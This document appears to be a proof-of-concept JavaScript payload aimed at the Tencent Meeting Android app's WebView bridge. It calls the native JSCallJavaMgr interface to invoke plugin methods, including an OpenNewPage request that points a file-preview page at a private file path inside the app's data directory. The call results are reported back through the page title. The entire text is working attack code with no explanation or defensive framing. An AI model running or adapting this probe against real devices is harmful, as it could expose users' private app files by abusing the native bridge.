(function(){
  document.title='P99TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P99CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P99TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P99TB-NOMGR:'+location.host;return}
  var path='/data/data/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['FP','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/chat_file_preview',
      router_params:{
        im_file_path:path,
        im_file_from_source:2,
        im_file_preview_request_id:'p99',
        filePath:path,
        url:path,
        from_webView:true
      }
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P99TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P99-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
